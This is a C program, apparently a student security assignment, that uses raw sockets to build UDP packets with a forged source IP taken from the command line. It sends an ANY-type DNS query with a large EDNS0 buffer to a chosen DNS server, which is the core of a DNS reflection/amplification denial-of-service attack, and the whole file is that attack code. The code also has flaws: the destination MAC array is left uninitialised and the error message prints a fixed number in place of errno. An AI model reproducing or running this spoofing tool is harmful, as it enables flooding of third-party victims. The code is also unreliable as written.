#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>  
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/sockios.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/if.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>


//The IP header checksum
unsigned short checksum(unsigned short* buff, int _16bitword)
{
unsigned long sum;
for(sum=0; _16bitword>0; _16bitword--)
sum+=htons(*(buff)++);
sum = ((sum >> 16) + (sum & 0xFFFF));
sum += (sum>>16);
return (unsigned short)(~sum);
}

int main(int argc, char *argv[]){
        int sock_raw;
        sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
        if(sock_raw == -1){
                printf("error in socket\n");
                return 1;
        }

        //Getting the index of the interface to send a packet
        struct ifreq ifreq_i;
        memset(&ifreq_i,0,sizeof(ifreq_i));
        strncpy(ifreq_i.ifr_name,"ens33",IFNAMSIZ-1); //giving name of Interface
  
        if((ioctl(sock_raw,SIOCGIFINDEX,&ifreq_i))<0)
                printf("error in index ioctl reading\n");//getting Index Name
  
        //printf("index=%d\n",ifreq_i.ifr_ifindex);
         
        //Getting the MAC address of the interface
        struct ifreq ifreq_c;
        memset(&ifreq_c,0,sizeof(ifreq_c));
        strncpy(ifreq_c.ifr_name,"ens33",IFNAMSIZ-1);//giving name of Interface
  
        if((ioctl(sock_raw,SIOCGIFHWADDR,&ifreq_c))<0) //getting MAC Address
                printf("error in SIOCGIFHWADDR ioctl reading");
         
        //Getting the IP address of the interface
        struct ifreq ifreq_ip;
        memset(&ifreq_ip,0,sizeof(ifreq_ip));
        strncpy(ifreq_ip.ifr_name,"ens33",IFNAMSIZ-1);//giving name of Interface
        if(ioctl(sock_raw,SIOCGIFADDR,&ifreq_ip)<0) //getting IP Address
        {
                printf("error in SIOCGIFADDR \n");
        }

        //Constructing the Ethernet header
        unsigned char *sendbuff;
        sendbuff=(unsigned char*)malloc(77); // increase in case of more data
        memset(sendbuff,0,77);
         
        struct ethhdr *eth = (struct ethhdr *)(sendbuff);
  
        eth->h_source[0] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[0]);
        eth->h_source[1] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[1]);
        eth->h_source[2] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[2]);
        eth->h_source[3] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[3]);
        eth->h_source[4] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[4]);
        eth->h_source[5] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[5]);
         
        //////////////////////////
        unsigned char DESTMAC[6];
        //////////////////////////
                 
        /* filling destination mac. DESTMAC0 to DESTMAC5 are macro having octets of mac address. */
        eth->h_dest[0] = DESTMAC[0];
        eth->h_dest[1] = DESTMAC[1];
        eth->h_dest[2] = DESTMAC[2];
        eth->h_dest[3] = DESTMAC[3];
        eth->h_dest[4] = DESTMAC[4];
        eth->h_dest[5] = DESTMAC[5];
  
        eth->h_proto = htons(ETH_P_IP); //means next header will be IP header
         
        ////////////////////////////////
        int total_len = 0;
        ////////////////////////////////
         
        /* end of ethernet header */
        total_len+=sizeof(struct ethhdr);
         
        //Constructing the IP header
        struct iphdr *iph = (struct iphdr*)(sendbuff + sizeof(struct ethhdr));
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 16;
        iph->id = htons(10201);
        iph->ttl = 128;
        iph->protocol = 17;
        iph->saddr = inet_addr(argv[1]);
        ///////////////////////////////////
        iph->daddr = inet_addr(argv[3]); // put destination IP address
  
         
        total_len += sizeof(struct iphdr);
         
        //Construct the UDP header
        struct udphdr *uh = (struct udphdr *)(sendbuff + sizeof(struct iphdr) + sizeof(struct ethhdr));
  
        uh->source = htons(atoi(argv[2]));
        uh->dest = htons(53);
        uh->check = checksum((unsigned short*)(sendbuff + sizeof(struct ethhdr) + sizeof(struct iphdr)), (sizeof(struct udphdr)/2));
          
        total_len+= sizeof(struct udphdr);
         
        //Adding data or the UDP payload
	//////////////ID: 0716055 -> aed17 /////////// 
	sendbuff[total_len++] = 0xed;
        sendbuff[total_len++] = 0x17;
        sendbuff[total_len++] = 0x01;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x01;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
	//////////////////////additional RR: 1 ///////////
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x01;
        ////////////////////// le.org ////////////////////
	sendbuff[total_len++] = 0x02;
        sendbuff[total_len++] = 0x6c;
        sendbuff[total_len++] = 0x65;
        sendbuff[total_len++] = 0x03;
        sendbuff[total_len++] = 0x6f;
        sendbuff[total_len++] = 0x72;
        sendbuff[total_len++] = 0x67;
	//////////////////////////////////////////////////
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0xff;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x01;
	///////////////////additional payload//////////////////
	//type: OPT, udppayload to 4096
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x29;
        sendbuff[total_len++] = 0x10;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;
        sendbuff[total_len++] = 0x00;

        //Filling the remaining fields of the IP and UDP headers
        uh->len = htons((total_len - sizeof(struct iphdr) - sizeof(struct ethhdr)));
        //UDP length field
        iph->tot_len = htons(total_len - sizeof(struct ethhdr));
        //IP length field


        iph->check = checksum((unsigned short*)(sendbuff + sizeof(struct ethhdr)), (sizeof(struct iphdr)/2));
        //printf("%u\n",iph->check);
        //Sending the packet
        struct sockaddr_ll sadr_ll;
        sadr_ll.sll_ifindex = ifreq_i.ifr_ifindex; // index of interface
        sadr_ll.sll_halen = ETH_ALEN; // length of destination mac address
        sadr_ll.sll_addr[0] = DESTMAC[0];
        sadr_ll.sll_addr[1] = DESTMAC[1];
        sadr_ll.sll_addr[2] = DESTMAC[2];
        sadr_ll.sll_addr[3] = DESTMAC[3];
        sadr_ll.sll_addr[4] = DESTMAC[4];
        sadr_ll.sll_addr[5] = DESTMAC[5];
         
        int send_len;
    	for(int i=0; i<3; i++){	
        	send_len = sendto(sock_raw,sendbuff,77,0,(const struct sockaddr*)&sadr_ll,sizeof(struct sockaddr_ll));
        	if(send_len<0)
        	{
                	printf("error in sending....sendlen=%d....errno=%d\n",send_len,12345);
                	return -1;

        	}
	}
        return 0;
}






